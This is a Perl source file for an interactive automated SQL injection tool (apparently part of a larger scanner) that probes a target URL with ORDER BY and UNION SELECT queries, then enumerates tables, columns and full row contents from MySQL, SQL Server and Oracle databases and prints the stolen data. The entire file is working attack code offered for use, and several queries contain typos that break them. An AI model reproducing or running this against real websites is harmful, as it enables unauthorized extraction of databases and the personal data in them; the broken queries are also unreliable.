#!/usr/bin/perl
use warnings;
use strict;
use 5.010;

sub sql_attack
{
    my ($crawl, $sql_scan) = @_;
    say "-------SQL ATTACK-------";
    while(1)
    {
        print "input attack url : ";
        chomp(my $target = <STDIN>);
        if($target eq 'q')
        {
            last;
        }
        elsif($target eq 'v')
        {
            say "-------SQL SCAN-------";
            say for sort keys %$sql_scan;
            next;
        }
        else
        {
            next unless exists ${$sql_scan}{$target};
        }


        my $field_number;
        my $count=1;
        my $flag=0;
        #order by 구문으로 필드 개수 확인 
        while(1)
        {
            eval{ $crawl->get($target.' order by '.$count) };
            my $content = $crawl->response->decoded_content;
            if($content=~/error/i)
            {
                $field_number=$count-1;
                last;
            }
            $count++;
            if($count>20)
            {
                $flag=1;
                print "$target can not sql injection\n";
                last;
            }
        }
        next if $flag;


        #union select 구문으로 데이터 타입이 문자열인 필드 찾기 위해 쿼리 작성 
        my $query = 'null';
        $query.=',null' x ($field_number-1);

        my @union_query;
        for(my $i=0; $i<$field_number; $i++)
        {
            my $copy_query = $query;
            substr($copy_query, $i*5, 4) = "'77777'";
            $copy_query = ' union select '.$copy_query;
            push @union_query, $copy_query;
        }

        
        #작성한 쿼리로 문자열 데이터 타입인 필드 찾기
        $count=1;
        my ($tag1, $tag2, $tag1_index, $tag2_index);
        my $string_field;
        for (@union_query)
        {
            eval{ $crawl->get($target.$_) };
            my $content=$crawl->response->decoded_content;

            if($content=~/(<\/?\s*\w*\s*\w*=?"?\w*"?>)\s*77777\s*(<\/\w*>)/) # 응답값에 77777 문자열이 있으면
            {
                ($tag1=$1) =~ s/\s//g;
                ($tag2=$2) =~ s/\s//g;
                $content=~s/\s//g;

                $tag1_index=index($content, $tag1.'77777');
                $tag2_index=index($content, $tag2, $tag1_index);

                $string_field=$count;
                last;
            }
            $count++;
        }
        $query = $union_query[$count-1];

        #information_schema 테이블을 이용하여 테이블명 확인 및 전송
        if(${$sql_scan}{$target}=~/mysql/i) 
        {
            $query=$union_query[$string_field-1]." from information_schema.tables where table_schema=database()";
            $query=~s/'77777'/group_concat(table_name)/;
        }
        elsif(${$sql_scan}{$target}=~/microsoft sql/i)
        {
            $query=$union_query[$string_field-1]." from information_schema.tables where table_schema=db_name()";
            $query=~s/'77777'/stuff((select ','+convert(varchar, table_name) from information_schmea.tables for xml path ('')),1,1,'')/;
        }
        elsif(${$sql_scan}{$target}=~/ora/i)
        {
            $query=$union_query[$string_field-1]." from user_tables";
            $query=~s/'77777'/substr(xmlagg(xmlelement(a,',' || table_name)).extract('\/\/text()'), 2)/;
        }


        eval{ $crawl->get($target.$query) };
        my $content=$crawl->response->decoded_content;
        $content=~s/\s//g;

        $tag1_index=index($content, $tag1, $tag1_index-1);
        $tag2_index=index($content, $tag2, $tag1_index);
        my $value_len=$tag2_index-$tag1_index-length($tag1);
        my $values=substr($content, $tag1_index+length($tag1), $value_len);
                
        my (@tables, %table_info);
        @tables=split(/,/,$values); 
        #저장된 테이블명을 토대로 테이블별 컬럼명 찾는 쿼리 작성 및 전송
        for my $table_name(@tables)
        {
            if(${$sql_scan}{$target}=~/mysql/i)
            {
                $query=$union_query[$string_field-1]." from information_schema.columns where table_name='$table_name'";
                $query=~s/'77777'/group_concat(column_name)/;
            } 
            elsif(${$sql_scan}{$target}=~/microsoft sql/i)
            {
                $query=$union_query[$string_field-1]." from information_schema.columns where table_name='$table_name'";
                $query=~s/'77777'/stuff((select ','+convert(varchar, columns_name) from information_schmea.columns for xml path ('')),1,1,'')/;
            }
            elsif(${$sql_scan}{$target}=~/ora/i)
            {
                $query=$union_query[$string_field-1]." from user_tab_columns where table_name='$table_name'";
                $query=~s/'77777'/substr(xmlagg(xmlelement(a,',' || column_name)).extract('\/\/text()'), 2)/;
            }
            eval{ $crawl->get($target.$query) };
            my $content=$crawl->response->decoded_content;
            $content=~s/\s//g;

            $tag1_index=index($content, $tag1, $tag1_index-1);
            $tag2_index=index($content, $tag2, $tag1_index);
            $value_len=$tag2_index-$tag1_index-length($tag1);
            $values=substr($content, $tag1_index+length($tag1), $value_len);
            
            $table_info{$table_name} = $values;
        }

        #각 테이블의 필드명의 데이터 얻어오기
        my @fields;
        while( my($table, $field_name)=each %table_info)
        {
            #테이블의 행 개수 구하기
            $query=$union_query[$string_field-1]." from $table";
            $query=~s/'77777'/count(*)/;

            eval{ $crawl->get($target.$query) };
            my $content=$crawl->response->decoded_content;
            $content=~s/\s//g;

            $tag1_index=index($content, $tag1, $tag1_index-1);
            $tag2_index=index($content, $tag2, $tag1_index);
            $value_len=$tag2_index-$tag1_index-length($tag1);
            $values=substr($content, $tag1_index+length($tag1), $value_len);

            my $table_rows = $values;
            
            say "###table : $table###";

            @fields=split(/,/,$field_name);

            #한 테이블의 필드들의 값을 얻어와서 @new_field_name, @new_field_value에 저장하기
            my (@field_values, @new_field_value, @new_field_name);
            for my $field_name (@fields)
            {
                $query=$union_query[$string_field-1]." from $table";
                $query=~s/'77777'/count($field_name)/;

                eval{ $crawl->get($target.$query) };
                my $content=$crawl->response->decoded_content;
                $content=~s/\s//g;

                $tag1_index=index($content, $tag1, $tag1_index-1);
                $tag2_index=index($content, $tag2, $tag1_index);
                $value_len=$tag2_index-$tag1_index-length($tag1);
                $values=substr($content, $tag1_index+length($tag1), $value_len);

                if($table_rows == $values)
                {
                    if(${$sql_scan}{$target}=~/mysql/i)
                    {
                        $query=$union_query[$string_field-1]." from $table";
                        $query=~s/'77777'/group_concat($field_name,\'---\')/;
                    }
                    elsif(${$sql_scan}{$target}=~/microsoft sql/i)
                    {
                        $query=$union_query[$string_field-1]." from $table";
                        $query=~s/'77777'/stuff((select '---,'+convert(varchar, $field_name) from $table for xml path ('')),1,4,'')/;
                    }
                    elsif(${$sql_scan}{$target}=~/ora/i)
                    {
                        $query=$union_query[$string_field-1]." from $table";
                        $query=~s/'77777'/substr(xmlagg(xmlelement(a,',---' || $field_name)).extract('\/\/text()'), 5)/;
                    }

                    eval{ $crawl->get($target.$query) };
                    my $content=$crawl->response->decoded_content;
                    $content=~s/\s//g;

                    $tag1_index=index($content, $tag1, $tag1_index-1);
                    $tag2_index=index($content, $tag2, $tag1_index);
                    $value_len=$tag2_index-$tag1_index-length($tag1);
                    $values=substr($content, $tag1_index+length($tag1), $value_len);
                    
                    push @new_field_name, $field_name;
                    @field_values=split(/---,?/,$values);
                    if(@field_values != $table_rows)
                    {
                        for(my $i=0; $i<$table_rows; $i++)
                        {
                            push @new_field_value, '...';
                        }
                    }
                    else
                    {
                        push @new_field_value, @field_values;
                    }
                    push @new_field_value, "//";
                }
                else
                {
                    if(${$sql_scan}{$target}=~/mysql/i)
                    {
                        for($count=0; $count<$table_rows; $count++)
                        {

                            $query=$union_query[$string_field-1]." from $table limit $count, 1";
                            $query=~s/'77777'/$field_name/;

                            eval{ $crawl->get($target.$query) };
                            my $content=$crawl->response->decoded_content;
                            $content=~s/\s//g;

                            $tag1_index=index($content, $tag1, $tag1_index-1);
                            $tag2_index=index($content, $tag2, $tag1_index);
                            $value_len=$tag2_index-$tag1_index-length($tag1);
                            $values=substr($content, $tag1_index+length($tag1), $value_len);

                            push @new_field_name, $field_name unless $count;
                            push @new_field_value, $values;
                            push @new_field_value, "//" if $table_rows == $count+1;
                                   
                        }
                    }
                    else
                    {
                        my $not_in_string;
                        for($count=0; $count<$table_rows; $count++)
                        {
                            if(!$count)
                            {
                                if(${$sql_scan}{$target}=~/microsoft sql/i)
                                {
                                    $query=$union_query[$string_field-1]." from $table";
                                    $query=~s/'77777'/top 1 $field_name/;
                                }
                                elsif(${$sql_scan}{$target}=~/ora/i)
                                {
                                    $query=$union_query[$string_field-1]." from $table rownum=1";
                                    $query=~s/'77777'/$field_name/;
                                }
                                push @new_field_name, $count;
                                $not_in_string .= "'$field_name'";
                            }
                            else
                            {
                                if(${$sql_scan}{$target}=~/microsoft sql/i)
                                {
                                    $query=$union_query[$string_field-1]." from $table where $field_name not in($not_in_string)";
                                    $query=~s/'77777'/top 1 $field_name/;
                                }
                                elsif(${$sql_scan}{$target}=~/ora/i)
                                {
                                    $query=$union_query[$string_field-1]." from $table where $field_name not in($not_in_string) and rownum=1";
                                    $query=~s/'77777'/$field_name/;
                                }
                                $not_in_string .= ",'$field_name'";
                            }

                            eval{ $crawl->get($target.$query) };
                            my $content=$crawl->response->decoded_content;
                            $content=~s/\s//g;

                            $tag1_index=index($content, $tag1, $tag1_index-1);
                            $tag2_index=index($content, $tag2, $tag1_index);
                            $value_len=$tag2_index-$tag1_index-length($tag1);
                            $values=substr($content, $tag1_index+length($tag1), $value_len);

#                            push @new_field_name, $field_name unless $count;
                            push @new_field_value, $values;
                            push @new_field_value, "//" if $table_rows == $count+1;
                        }
                    }

                }
            }
            
            my $max_length = 15;
            my $max_string = 10;
           
            printf "%${max_length}s"x($#new_field_name+1), @new_field_name;
            say '';

            for(my $i=0; $i<$table_rows; $i++)
            {
                for(my $j=0; $j<($#new_field_name)+1; $j++)
                {
                    my $current_field_value = $new_field_value[$i+($j*($table_rows+1))];

                    if(length($current_field_value)>$max_string)
                    {
                        substr($current_field_value, $max_string) = '...';
                    }
                    printf "%${max_length}s", $current_field_value;
                }
                say '';
            }
            say '';

#            @fields = ();
#            @new_field_value = ();
#            @new_field_name = ();
        }
    }
}
1;
